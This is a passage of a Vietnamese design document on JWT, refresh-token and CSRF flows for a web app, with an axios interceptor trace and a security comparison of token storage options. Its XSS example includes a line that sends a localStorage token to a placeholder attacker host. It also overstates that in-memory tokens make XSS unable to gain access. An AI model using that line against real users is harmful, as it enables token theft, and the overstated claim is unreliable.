     → Nếu không tìm thấy → Result.Fail(ErrorCodes.UserNotFound)
  
  3. Kiểm tra ExpiresAt > DateTime.UtcNow
     → Nếu hết hạn → Result.Fail(ErrorCodes.UserNotFound)
  
  4. Thu hồi token cũ:
     UPDATE RefreshToken SET IsRevoked = true WHERE Id = @id
  
  5. UserManager.FindByIdAsync(userId)
     → Tìm user trong AspNetUsers
     → Nếu không tìm thấy → Result.Fail(ErrorCodes.UserNotFound)
  
  6. GenerateTokensAsync(user, roles, rememberMe)
     → JWT mới + RefreshToken mới
     → Lưu RefreshToken mới vào DB
     → Set cookies mới (refreshToken + CSRF-TOKEN)
  
  7. Return Result.Success(RefreshTokenResponse { accessToken, expiredAt })
```

#### Response Thành Công (200)

```
Status: 200 OK
Set-Cookie: refreshToken=<new-base64>; HttpOnly; Secure; SameSite=None; Path=/; Max-Age=2592000
Set-Cookie: CSRF-TOKEN=<new-guid>; Secure; SameSite=None; Path=/

Body:
{
  "accessToken": "eyJhbGciOiJIUzI1NiIs...",
  "expiredAt": "2026-06-15T14:45:00Z"
}
```

#### FE Nhận Response → Lưu Data

```
FE nhận response 200:
  ↓
useAuth hook setToken(newAccessToken):
  ┌──────────────────────────────────────────────────────┐
  │  Zustand Store (RAM)                                  │
  │  ┌─────────────────────────────────────────────────┐ │
  │  │ token: "eyJhbGciOiJIUzI1NiIs..." (MỚI)          │ │
  │  │ user: null (chưa có, sẽ fetch /me)               │ │
  │  │ isAuthenticated: true                             │ │
  │  │ isLoading: true (đang chờ /me)                   │ │
  │  │ isRefreshing: false                               │ │
  │  └─────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────┘
  ↓
Tiếp theo: Gọi GET /api/auth/me (xem flow 7.3)
```

#### Response Lỗi (Refresh Token Invalid)

```
Refresh token không hợp lệ hoặc hết hạn:
Status: 400
{
  "code": "USER_NOT_FOUND",
  "message": "Invalid refresh token"
}

→ FE handle:
  ┌──────────────────────────────────────────────────────┐
  │  Zustand Store (RAM)                                  │
  │  ┌─────────────────────────────────────────────────┐ │
  │  │ token: null                                      │ │
  │  │ user: null                                       │ │
  │  │ isAuthenticated: false                            │ │
  │  │ isLoading: false                                  │ │
  │  │ isRefreshing: false                               │ │
  │  └─────────────────────────────────────────────────┘ │
  │  Action: redirect /login                              │
  └──────────────────────────────────────────────────────┘
```

---

### 7.3 Flow Fetch User Profile: `GET /api/auth/me`

#### Request (FE → BE)

```
Headers:
  ┌──────────────────────────────┐
  │ Authorization: Bearer eyJ...  │  ← Từ Zustand store (access token vừa refresh)
  │ Cookie: CSRF-TOKEN=<guid>    │  ← Có gửi cookie nhưng GET không cần CSRF
  └──────────────────────────────┘

Body: (không có)
```

#### Backend Xử Lý

```
Middleware Pipeline:
  1-6: pass
  7. Authentication (JWT):
     → Parse Authorization: Bearer <token>
     → Validate signature (HMAC-SHA256 với JwtKey)
     → Validate Issuer, Audience
     → Validate Expiry (exp claim)
     → Nếu hết hạn → set header Token-Expired: true → return 401
     → Nếu hợp lệ → set HttpContext.User từ claims
       Claims: { nameid: "user-guid", email: "...", unique_name: "...", role: "User" }
  
  8. CSRFMiddleware → SKIP (GET method)
  9. Authorization → pass ([Authorize] ok vì JWT valid)
  
Controller (AuthController):
  → Lấy userId từ HttpContext.User.FindFirst(ClaimTypes.NameIdentifier)?.Value
  → mediator.Send(new GetCurrentUserQuery(userId))
  
Handler:
  → IUserQueryRepository.GetByIdAsync(userId)
  → Dapper/SqlKata query: SELECT Id, Email, FirstName, LastName, ... FROM AspNetUsers WHERE Id = @userId
  → Return UserProfileDto
```

#### Response Thành Công (200)

```
Status: 200 OK

Body:
{
  "id": "a1b2c3d4-...",
  "email": "user@example.com",
  "firstName": "Nguyen",
  "lastName": "Thanh Tuan",
  "role": "User",
  "avatar": null
}
```

#### FE Nhận Response → Lưu Data

```
FE nhận response 200:
  ↓
useAuth hook setUser(profile):
  ┌──────────────────────────────────────────────────────┐
  │  Zustand Store (RAM)                                  │
  │  ┌─────────────────────────────────────────────────┐ │
  │  │ token: "eyJhbGciOiJIUzI1NiIs..."                │ │
  │  │ user: {                                         │ │
  │  │   id: "a1b2c3d4-...",                           │ │
  │  │   email: "user@example.com",                     │ │
  │  │   firstName: "Nguyen",                           │ │
  │  │   lastName: "Thanh Tuan",                        │ │
  │  │   name: "Nguyen Thanh Tuan",    ← FE combine     │ │
  │  │   role: "User"                                   │ │
  │  │ }                                                │ │
  │  │ isAuthenticated: true                             │ │
  │  │ isLoading: false      ← KẾT THÚC LOADING         │ │
  │  │ isRefreshing: false                               │ │
  │  └─────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────┘
  ↓
  Dashboard/WelcomeHero render "Chào mừng, Nguyen Thanh Tuan!"
```

#### Response Lỗi

```
Token hết hạn (401):
Status: 401
Header: Token-Expired: true
Body: Không có (hoặc error response)

→ FE handle:
  Axios response interceptor:
  → Gọi refresh-token → lấy access token mới → retry /me
  
Token không hợp lệ (401):
Status: 401
Body: { "code": "GENERAL_ERROR", "message": "..." }

→ FE handle:
  logout() → redirect /login

Server Error (500):
Status: 500
Body: { "code": "GENERAL_ERROR", "message": "..." }

→ FE handle:
  toast.error("Không thể tải thông tin người dùng")
  isLoading = false
```

---

### 7.4 Flow Logout: `POST /api/auth/logout`

#### Request (FE → BE)

```
Headers:
  ┌──────────────────────────────┐
  │ Content-Type: application/json│
  │ Authorization: Bearer eyJ...  │  ← Có thể có (BE không bắt buộc cho logout)
  │ Cookie: refreshToken=<base64> │  ← Cookie HttpOnly tự động
  │ X-CSRF-TOKEN: <guid>         │  ← Auth endpoint nên BYPASS CSRF
  └──────────────────────────────┘

Body: {} (empty)
```

#### Backend Xử Lý

```
Middleware:
  1-7: pass
  8. CSRFMiddleware → BYPASS (auth endpoint)
  9. pass

Controller:
  → mediator.Send(new LogoutCommand())
  → LogoutCommandHandler → TokenService.RevokeRefreshTokenAsync()

TokenService.RevokeRefreshTokenAsync():
  1. Đọc cookie refreshToken
  2. Tìm trong DB
  3. Set IsRevoked = true
  4. SaveChanges
  5. AuthCookieService.ClearAuthCookies()
     → Set-Cookie: refreshToken=; Expires=Thu, 01 Jan 1970
     → Set-Cookie: CSRF-TOKEN=; Expires=Thu, 01 Jan 1970
  6. Return Result.Success()
```

#### Response (200)

```
Status: 200 OK
Set-Cookie: refreshToken=; Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: CSRF-TOKEN=; Expires=Thu, 01 Jan 1970 00:00:00 GMT

Body: {} hoặc { "message": "Logged out" }
```

#### FE Nhận Response → Xóa Data

```
FE nhận response 200:
  ↓
useAuthStore.logout():
  ┌──────────────────────────────────────────────────────┐
  │  Zustand Store (RAM)                                  │
  │  ┌─────────────────────────────────────────────────┐ │
  │  │ token: null                                      │ │
  │  │ user: null                                       │ │
  │  │ isAuthenticated: false                            │ │
  │  │ isLoading: false                                  │ │
  │  │ isRefreshing: false                               │ │
  │  └─────────────────────────────────────────────────┘ │
  │  localStorage: KHÔNG CÓ gì (không bao giờ lưu token)  │
  │  Cookie: refreshToken= (đã xóa bởi BE)                │
  └──────────────────────────────────────────────────────┘
  ↓
router.push('/login')
```

---

### 7.5 Tổng Kết: Data Lưu Ở Đâu?

| Data | FE lưu | BE lưu | HttpOnly? | TTL | Ghi chú |
|------|--------|--------|-----------|-----|---------|
| **Access Token (JWT)** | Zustand RAM | ❌ Không | ❌ Không | 15 phút | Chỉ RAM, mất khi F5 → silent refresh |
| **Refresh Token** | Cookie (browser) | DB (`RefreshToken` table) | ✅ **Có** | 30 ngày | Không thể đọc bằng JS |
| **CSRF Token** | Cookie (browser) | ❌ Không (chỉ set cookie) | ❌ Không | 30 ngày | JS đọc → gửi header |
| **User Profile** | Zustand RAM | DB (`AspNetUsers`) | N/A | Phiên | Fetch lại khi F5 qua `/me` |
| **JWT Claims** | N/A (decode 1 lần) | Trong JWT payload | N/A | 15 phút | BE giải mã từ Bearer header |

---

### 7.6 Trace Request qua `src/shared/api/index.ts`

File này có **4 phần chính**, mỗi request đi qua theo thứ tự:

```
[REQUEST] → Request Interceptor (dòng 113-132)
          → HTTP (BE)
          → Response Interceptor (dòng 196-232)
          → [CALLER nhận response/error]
```

Dưới đây là trace từng dòng code với giá trị cụ thể cho 4 loại request.

---

#### 7.6.1 Trace 1: GET /api/transactions (token còn hạn)

```text
Component gọi: client.instance.get('/api/transactions')

┌─────────────────────────────────────────────────────────────────────────────┐
│ REQUEST INTERCEPTOR (dòng 113-132)                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  dòng 114  const authStore = useAuthStore.getState()                        │
│             → { token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',           │
│                 user: { id, email, name, role },                             │
│                 isAuthenticated: true, isLoading: false }                    │
│                                                                             │
│  dòng 115  const url = '/api/transactions'                                  │
│                                                                             │
│  dòng 117  authStore.token && !url.includes('/refresh-token')               │
│             → 'eyJ...' && true  →  true                                     │
│  dòng 118  reqConfig.headers.Authorization = 'Bearer eyJ...'                │
│             ✅ Gắn Bearer token                                              │
│                                                                             │
│  dòng 121  const method = 'get'                                             │
│  dòng 122  ['post','put','patch','delete'].includes('get') → false          │
│                                                                             │
│  dòng 124  if (isMutating) → false                                         │
│             ❌ Không gắn CSRF (GET không cần)                                │
│                                                                             │
│  dòng 131  return reqConfig  → request gửi đi                               │
│             Headers: { Authorization: 'Bearer eyJ...' }                     │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│ BE: 200 OK → { data: [...danh sách giao dịch...] }                         │
├─────────────────────────────────────────────────────────────────────────────┤
│ RESPONSE INTERCEPTOR (dòng 196-232)                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  dòng 197  (response) => response                                          │
│             ← 200 OK → pass through                                         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

#### 7.6.2 Trace 2: GET /api/transactions → 401 → refresh → retry → 200

```text
Component gọi: client.instance.get('/api/transactions')
               (access token trong Zustand đã hết hạn 15 phút)

┌─────────────────────────────────────────────────────────────────────────────┐
│ REQUEST INTERCEPTOR (dòng 113-132)                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  dòng 117  token tồn tại → vẫn gắn Bearer (chưa biết hết hạn)               │
│  dòng 131  return reqConfig  → request gửi đi                               │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│ BE: 401 + Header Token-Expired: true                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│ RESPONSE INTERCEPTOR (dòng 196-232)                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  error = AxiosError {                                                       │
│    response: { status: 401, headers: { 'token-expired': 'true' } },         │
│    config: { url: '/api/transactions', method: 'get', _retry: undefined }   │
│  }                                                                          │
│                                                                             │
│  dòng 200  const originalRequest = error.config as RetryConfig              │
│             → { url: '/api/transactions', method: 'get', _retry: undefined }│
│                                                                             │
│  dòng 203  !originalRequest → false (có config)                             │
│  dòng 205  error.response?.status !== 401 → 401 !== 401 → false             │
│  dòng 207  return Promise.reject → KHÔNG (vì cả 2 điều kiện đều false)      │
│                                                                             │
│  dòng 211  originalRequest.url?.includes('/refresh-token')                  │
│             → '/api/transactions'.includes('/refresh-token') → false         │
│             → KHÔNG reject (tiếp tục)                                        │
│                                                                             │
│  dòng 216  originalRequest._retry → undefined → falsy                       │
│             → KHÔNG reject (tiếp tục)                                        │
│                                                                             │
│  dòng 220  originalRequest._retry = true  ← ĐÁNH DẤU                        │
│             → { url: '/api/transactions', _retry: true }                    │
│                                                                             │
│  dòng 222  try {                                                            │
│  dòng 223    const newToken = await performRefresh()                        │
│               ↓                                                             │
│                                                                             │
│ ┌─────────────────────────────────────────────────────────────────────────┐ │
│ │ performRefresh() (dòng 73-100)                                           │ │
│ ├─────────────────────────────────────────────────────────────────────────┤ │
│ │                                                                         │ │
│ │  dòng 75  isRefreshing → false (chưa ai refresh)                        │ │
│ │                                                                         │ │
│ │  dòng 82  isRefreshing = true  ← KHÓA CỜ                                 │ │
│ │  dòng 83  useAuthStore.getState().setRefreshing(true)                    │ │
│ │             → Zustand: isRefreshing: true                                │ │
│ │                                                                         │ │
│ │  dòng 86  const newToken = await callRefreshApi()                       │ │
│ │             ↓                                                           │ │
│ │ ┌─────────────────────────────────────────────────────────────────────┐ │ │
│ │ │ callRefreshApi() (dòng 63-71)                                       │ │ │
│ │ ├─────────────────────────────────────────────────────────────────────┤ │ │
│ │ │                                                                     │ │ │
│ │ │  dòng 64  axios.post(                                                │ │ │
│ │ │             'https://localhost:7160/api/auth/refresh-token',          │ │ │
│ │ │             {},                                                       │ │ │
│ │ │             { withCredentials: true }                                │ │ │
│ │ │           )                                                          │ │ │
│ │ │                                                                     │ │ │
│ │ │  Đây là axios RIÊNG (import từ 'axios' dòng 1)                      │ │ │
│ │ │  KHÔNG PHẢI client.instance → KHÔNG đi qua interceptor              │ │ │
│ │ │  → Cookie HttpOnly refreshToken=abc... tự động gửi                   │ │ │
│ │ │                                                                     │ │ │
│ │ │  BE xử lý:                                                          │ │ │
│ │ │    1. Đọc cookie refreshToken → 'abc...'                            │ │ │
│ │ │    2. SELECT FROM RefreshToken WHERE Token = 'abc...'               │ │ │
│ │ │    3. Không hết hạn, không revoked → valid                          │ │ │
│ │ │    4. UPDATE RefreshToken SET IsRevoked = true (revoke cũ)          │ │ │
│ │ │    5. INSERT RefreshToken (token mới)                               │ │ │
│ │ │    6. Generate JWT mới + Set-Cookie refreshToken=xyz...             │ │ │
│ │ │    7. Return 200 { accessToken: 'eyJhbGciOiJIUzI1NiJ9...' }         │ │ │
│ │ │                                                                     │ │ │
│ │ │  dòng 70  .then(res => res.data.accessToken)                        │ │ │
│ │ │             → 'eyJhbGciOiJIUzI1NiJ9...'                             │ │ │
│ │ └─────────────────────────────────────────────────────────────────────┘ │ │
│ │                                                                         │ │
│ │  ← newToken = 'eyJhbGciOiJIUzI1NiJ9...'                                │ │
│ │                                                                         │ │
│ │  dòng 88  useAuthStore.getState().setToken(newToken)                    │ │
│ │             → Zustand: token = 'eyJhbGciOiJIUzI1NiJ9...'               │ │
│ │                                                                         │ │
│ │  dòng 89  processQueue(null, newToken)                                 │ │
│ │             → failedQueue = [] (rỗng, không request nào đợi)            │ │
│ │                                                                         │ │
│ │  dòng 91  return newToken → 'eyJhbGciOiJIUzI1NiJ9...'                  │ │
│ │                                                                         │ │
│ │  dòng 97  isRefreshing = false  ← MỞ KHÓA                               │ │
│ │  dòng 98  useAuthStore.getState().setRefreshing(false)                  │ │
│ │             → Zustand: isRefreshing: false                              │ │
│ │ └─────────────────────────────────────────────────────────────────────┘ │
│                                                                             │
│  ← newToken = 'eyJhbGciOiJIUzI1NiJ9...'                                    │
│                                                                             │
│  dòng 225  originalRequest.headers.Authorization = 'Bearer eyJhbGciOiJ...'  │
│             → Header mới với token mới                                      │
│                                                                             │
│  dòng 226  return client.instance(originalRequest)                         │
│             → RETRY GET /api/transactions với Bearer mới                    │
│             → Request này đi qua INTERCEPTOR LẦN NỮA                       │
│                                                                             │
│ ┌─────────────────────────────────────────────────────────────────────────┐ │
│ │ RETRY — Request interceptor (dòng 113-132)                              │ │
│ ├─────────────────────────────────────────────────────────────────────────┤ │
│ │  dòng 114  authStore.token → 'eyJhbGciOiJIUzI1NiJ9...' (MỚI)           │ │
│ │  dòng 118  Gắn Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...             │ │
│ │                                                                         │ │
│ ├─────────────────────────────────────────────────────────────────────────┤ │
│ │ BE: 200 OK ← token mới hợp lệ                                           │ │
│ ├─────────────────────────────────────────────────────────────────────────┤ │
│ │ Response interceptor: 200 → pass through                                │ │
│ └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                             │
│  ← Cuối cùng: component nhận response 200 với dữ liệu                       │
│  → user thấy danh sách giao dịch, KHÔNG BIẾT đã có 401 + refresh           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

#### 7.6.3 Trace 3: 2 request song song GET /trips + GET /profile (cùng 401)

```text
Dashboard mount → 2 request cùng lúc:
  Request A: client.instance.get('/api/trips')       (time 0ms)
  Request B: client.instance.get('/api/profile')     (time 1ms)

Cả 2 đều có Bearer token cũ (hết hạn).

┌─────────────────────────────────────────────────────────────────────────────┐
│ THỜI GIAN 0ms - Request A                                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Request A: GET /api/trips → 401                                           │
│                                                                             │
│  dòng 220  originalRequest._retry = true (cho Request A)                    │
│  dòng 223  const newToken = await performRefresh()                         │
│                                                                             │
│  performRefresh():                                                          │
│    dòng 75  isRefreshing → false → tiếp tục                                │
│    dòng 82  isRefreshing = true  ← KHÓA                                     │
│    dòng 86  await callRefreshApi()  → đang chờ HTTP                        │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│ THỜI GIAN 1ms - Request B                                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Request B: GET /api/profile → 401                                         │
│                                                                             │
│  dòng 220  originalRequest._retry = true (cho Request B)                    │
│  dòng 223  const newToken = await performRefresh()                         │
│                                                                             │
│  performRefresh():                                                          │
│    dòng 75  isRefreshing → true (đã khóa ở Request A)                      │
│    dòng 76  return new Promise<string>((resolve, reject) => {              │
│    dòng 77    failedQueue.push({ resolve, reject })                         │
│    dòng 78  })                                                             │
│             → Promise TREO                                                 │
│             → Request B treo, chờ resolve                                  │
│                                                                             │
│  failedQueue = [                                                            │
│    { resolve: resolveFn_B, reject: rejectFn_B }  ← Request B               │
│  ]                                                                          │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│ THỜI GIAN 500ms - callRefreshApi() trả về (Request A)                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  dòng 88  setToken('eyJ...')  → Zustand: token mới                         │
│  dòng 89  processQueue(null, 'eyJ...')                                     │
│             → failedQueue = [{ resolve: resolveFn_B }]                      │
│             → resolveFn_B('eyJ...')  ← Request B được giải thoát            │
│             → failedQueue = [] (đã clear)                                   │
│  dòng 91  return 'eyJ...'                                                  │
│                                                                             │
│  ← Request A có newToken → retry GET /api/trips → 200 OK                   │
│                                                                             │
│  ← Request B (Promise treo) nhận resolve('eyJ...')                         │
│     → dòng 225  originalRequest.headers.Authorization = 'Bearer eyJ...'     │
│     → dòng 226  return client.instance(originalRequest)                    │
│     → Retry GET /api/profile → 200 OK                                      │
│                                                                             │
│  KẾT QUẢ: Cả 2 request đều 200, chỉ 1 lần gọi refresh                    │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

#### 7.6.4 Trace 4: POST /api/auth/login (chưa có token)

```text
Component gọi: client.instance.post('/api/auth/login', { email, password })

┌─────────────────────────────────────────────────────────────────────────────┐
│ REQUEST INTERCEPTOR (dòng 113-132)                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  dòng 114  const authStore = useAuthStore.getState()                        │
│             → { token: null, isAuthenticated: false, ... }                  │
│                                                                             │
│  dòng 117  authStore.token && !url.includes('/refresh-token')               │
│             → null && true  →  false                                        │
│  dòng 118  ❌ KHÔNG gắn Bearer (chưa login)                                 │
│                                                                             │
│  dòng 121  method = 'post'                                                  │
│  dòng 122  ['post',...].includes('post') → true                             │
│                                                                             │
│  dòng 124  if (isMutating) → true                                          │
│  dòng 125  const csrf = getCSRFToken()                                     │
│             → document.cookie → 'CSRF-TOKEN=guid-xyz; ...'                 │
│             → 'guid-xyz'                                                   │
│  dòng 127  reqConfig.headers['X-CSRF-TOKEN'] = 'guid-xyz'                  │
│             ✅ Gắn CSRF (tuy nhiên BE bypass CSRF cho auth endpoint)         │
│                                                                             │
│  dòng 131  return reqConfig                                                 │
│             Headers: { 'X-CSRF-TOKEN': 'guid-xyz' }                        │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│ BE: 200 OK → { accessToken: 'eyJ...', userId, email, roles }               │
├─────────────────────────────────────────────────────────────────────────────┤
│ RESPONSE INTERCEPTOR (dòng 196-232)                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  dòng 197  (response) => response  ← 200 OK → pass through                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘

Sau đó useLoginForm.ts xử lý:
  const user = { id: result.userId, email: result.email, name: ..., role: 'User' }
  login(result.accessToken!, user)
  → Zustand: token = 'eyJ...', user = { id, email, name, role }
  → Từ request tiếp theo, interceptor sẽ gắn Bearer
```

---

#### 7.6.5 Trace 5: useAuth hook gọi performRefresh (app mount/F5)

```text
useAuth.ts (dòng 6):
  import { callRefreshApi, performRefresh } from '@/shared/api'

  File này KHÔNG dùng client.instance
  → Gọi trực tiếp performRefresh() (export từ index.ts dòng 239)

  performRefresh() là function CHUNG:
  - Dùng chung isRefreshing flag với interceptor
  - Dùng chung failedQueue với interceptor
  - Dùng chung processQueue với interceptor

  Kết quả:
  - Nếu interceptor đang refresh (có 401 từ API) → hook QUEUE
  - Nếu hook đang refresh → interceptor QUEUE
  - Không bao giờ 2 luồng refresh song song
```

---

#### 7.6.6 Tổng kết: 3 đường đi qua index.ts

```text
                        ┌──────────────────────┐
                        │   callRefreshApi()    │
                        │  (axios riêng, dòng  │
                        │   64-70)              │
                        └──────────┬───────────┘
                                   │
                                   │ Không interceptor
                                   │ (dùng axios thường)
                                   ▼
┌─────────────────────────────────────────────────────────────────────┐
│  client.instance (có interceptor)                                   │
│                                                                     │
│  1. GET/POST bất kỳ (trừ /refresh-token)                           │
│     → Request interceptor: gắn Bearer + CSRF                       │
│     → Response interceptor: 401 → performRefresh()                 │
│                                                                     │
│  2. POST /api/auth/login (không token)                             │
│     → Request interceptor: CSRF (nếu có), KHÔNG Bearer             │
│     → Response interceptor: 200 → pass through                     │
│                                                                     │
│  3. POST /refresh-token (gọi từ interceptor hay hook?)             │
│     → Dùng axios riêng → KHÔNG interceptor                         │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 8. So Sánh Bảo Mật: Current (localStorage) vs Option B (RAM + HttpOnly)

### 8.1 Tổng Quan

| Khía cạnh | **Current (localStorage)** | **Option B (RAM + HttpOnly)** |
|-----------|---------------------------|------------------------------|
| Access token lưu | `localStorage` (JS đọc được) | **Zustand RAM** (JS không dump được) |
| Refresh token lưu | ❌ Không dùng (chỉ access token) | **HttpOnly cookie** (JS không đọc được) |
| User data lưu | ❌ Không lưu (mất sau refresh) | **Zustand RAM** + fetch `/me` |
| Token persist sau F5 | ✅ Có (localStorage) | ❌ Mất → silent refresh |
| Route protection | ❌ Không có middleware | ✅ Next.js middleware + client guard |
| CSRF protection | ✅ Có (đã implement) | ✅ Giữ nguyên + chỉ cho mutating |
| CSP headers | ❌ Chưa có | ✅ Thêm CSP trong next.config |
| Auto refresh khi 401 | ❌ Không | ✅ queue + retry |

### 8.2 Phân Tích Từng Vector Tấn Công

#### XSS (Cross-Site Scripting) — Mối đe dọa lớn nhất

```
Kịch bản tấn công:
  User click link độc hại → script chạy trên trình duyệt
  → Script có thể đọc localStorage, gọi API, đọc DOM

┌─────────────────────────────────────────────────────────────┐
│ CURRENT (localStorage):                                      │
│                                                              │
│  /* Hacker inject */                                         │
│  const token = localStorage.getItem('tnp_token')             │
│  fetch('https://evil.com/steal?t=' + token)                  │
│                                                              │
│  ✅ Đánh cắp access token thành công                          │
│  ✅ Dùng token để gọi API với quyền của user                  │
│  ❌ TOKEN VÔ HIỆU TRONG 15 PHÚT (nếu BE enforce TTL)        │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ OPTION B (RAM + HttpOnly):                                   │
│                                                              │
│  /* Hacker inject */                                         │
│  localStorage.getItem('tnp_token') → null                    │
│  document.cookie → refreshToken KHÔNG CÓ (HttpOnly)          │
│                                                              │
│  ❌ Không thể lấy access token từ localStorage                │
│  ❌ Không thể lấy refresh token từ cookie (HttpOnly)          │
│  ⚠️ Có thể đọc CSRF-TOKEN (nhưng vô dụng vì không có token) │
│                                                              │
│  KẾT LUẬN: XSS không thể chiếm quyền truy cập               │
└─────────────────────────────────────────────────────────────┘
```

**Mức độ nghiêm trọng:**
| Current | Option B |
|---------|----------|
| 🚨 **CAO** — Token trong localStorage là mục tiêu số 1 của XSS | ✅ **THẤP** — Token trong RAM, refresh token HttpOnly |

#### CSRF (Cross-Site Request Forgery)

```
Kịch bản tấn công:
  User đang đăng nhập → click link độc hại
  → Request giả mạo từ domain khác
  → Cookie tự động gửi kèm (nếu không có SameSite)

┌─────────────────────────────────────────────────────────────┐
│ CURRENT:                                                     │
│  ✅ Đã có CSRF-TOKEN cookie + X-CSRF-TOKEN header            │
│  ❌ Interceptor gắn CSRF cho TẤT CẢ request (kể cả GET)      │
│     (dư thừa nhưng không hại)                                │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ OPTION B:                                                    │
│  ✅ CSRF-TOKEN cookie + X-CSRF-TOKEN header                  │
│  ✅ Chỉ gắn cho POST/PUT/PATCH/DELETE (đúng chuẩn)           │
│  ✅ Auth endpoints BYPASS CSRF (backend config)              │
└─────────────────────────────────────────────────────────────┘
```

**Mức độ nghiêm trọng:**
| Current | Option B |
|---------|----------|
| ✅ **THẤP** — Đã có CSRF protection | ✅ **THẤP** — Giống current + tối ưu hơn |

#### Session Hijacking (Đánh cắp phiên)

```
Kịch bản:
  Attacker lấy được access token của victim (qua XSS, MITM, ...)
  → Dùng token để giả mạo request

┌─────────────────────────────────────────────────────────────┐
│ CURRENT:                                                     │
│  Attacker có token từ localStorage → ✅ Dùng được             │
│  Thời gian hiệu lực: 15 phút (nếu BE enforce)               │
│  Hết hạn → ❌ Mất quyền truy cập (không có refresh token)    │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ OPTION B:                                                    │
│  Attacker có token từ RAM (khó hơn, cần XSS + dump memory)   │
│  Thời gian hiệu lực: 15 phút                                 │
│  Hết hạn → ❌ KHÔNG THỂ refresh vì refresh token HttpOnly   │
│  (Attacker không có refresh token → không thể lấy token mới) │
└─────────────────────────────────────────────────────────────┘

**Token rotation (OPTION B có, CURRENT không):**
  Mỗi lần refresh:
  - Token cũ bị revoke trong DB (IsRevoked = true)
  - Token mới được cấp
  → Nếu attacker đã lấy token cũ, nó không thể dùng lại
```

**Mức độ nghiêm trọng:**
| Current | Option B |
|---------|----------|
| ⚠️ **TRUNG BÌNH** — Token dễ bị đánh cắp, nhưng hết hạn sau 15 phút | ✅ **THẤP** — Khó đánh cắp hơn, refresh an toàn hơn (rotation) |

#### Replay Attack (Phát lại request cũ)

```
Kịch bản:
  Attacker chặn được request HTTP (MITM trên mạng không an toàn)
  → Gửi lại request với token cũ

┌─────────────────────────────────────────────────────────────┐
│ Cả CURRENT và OPTION B:                                      │
│  ✅ JWT có exp claim → token hết hạn sau 15 phút            │
│  ✅ Nếu backend enforce exp → token cũ bị từ chối            │
│  ⚠️ Nếu không có HTTPS → dễ bị chặn (backend yêu cầu HTTPS) │
└─────────────────────────────────────────────────────────────┘
```

**Mức độ nghiêm trọng:**
| Current | Option B |
|---------|----------|
| ✅ **THẤP** (HTTPS + JWT exp) | ✅ **THẤP** (giống nhau) |

#### Brute Force (Tấn công mật khẩu)

```
Kịch bản:
  Attacker gửi nhiều request login với password khác nhau

┌─────────────────────────────────────────────────────────────┐
│ Backend đã implement:                                        │
│  ✅ ASP.NET Core Identity lockout: 5 lần sai → khóa 10 phút │
│  ✅ Email confirmation bắt buộc trước khi login              │
│  ❌ THIẾU: Rate limiting trên login/OTP endpoints            │
│     (được ghi nhận trong TECHNICAL_DOCUMENTATION.md:645)     │
└─────────────────────────────────────────────────────────────┘
```

**Mức độ nghiêm trọng:**
| Current | Option B |
|---------|----------|
| ⚠️ **TRUNG BÌNH** — Không thay đổi (vấn đề backend) | ⚠️ **TRUNG BÌNH** — Không thay đổi |

### 8.3 Bảng So Sánh Chi Tiết

| Vector tấn công | Current (localStorage) | Option B (RAM + HttpOnly) | Cải thiện? |
|----------------|----------------------|--------------------------|------------|
| **XSS → đánh cắp token** | 🚨 **Dễ** — `localStorage.getItem()` | ✅ **Khó** — Token RAM, refresh cookie HttpOnly | ✅ **CAO** |
| **XSS → gọi API giả mạo** | 🚨 **Dễ** — Có token sẵn | ⚠️ **Khó hơn** — Phải đọc Zustand store | ✅ **CAO** |
| **CSRF → request trái phép** | ✅ Đã có CSRF token | ✅ Đã có CSRF token | ⚖️ **KHÔNG ĐỔI** |
| **Session hijack (dùng token cũ)** | ⚠️ Token trong localStorage | ✅ Rotation + HttpOnly refresh | ✅ **CAO** |
| **Replay attack** | ✅ JWT exp 15 phút | ✅ JWT exp 15 phút | ⚖️ **KHÔNG ĐỔI** |
| **Brute force** | ⚠️ Lockout 5 lần | ⚠️ Lockout 5 lần | ⚖️ **KHÔNG ĐỔI** |
| **User data leak (sau XSS)** | 🚨 **Dễ** — Có thể gọi API với token | ✅ **Khó** — Phải có token trước | ✅ **CAO** |
| **Refresh page → mất user data** | ❌ **CÓ** (user data không persist) | ⚠️ **TẠM THỜI** → silent refresh | ⚖️ UX tradeoff |
| **Multi-tab sync** | ✅ Tự động (cùng localStorage) | ⚠️ Cần BroadcastChannel | ⚖️ UX tradeoff |

### 8.4 Điểm Yếu Còn Lại Sau Khi Áp Dụng Option B

Dù Option B cải thiện đáng kể, vẫn còn những điểm yếu cần lưu ý:

| # | Điểm yếu | Ảnh hưởng | Giải pháp (tương lai) |
|---|---------|-----------|----------------------|
| 1 | **CSP headers chưa đầy đủ** ở frontend | CSP chỉ chặn inline script nếu config đúng | Cập nhật `next.config.ts` trong Phase 8 |
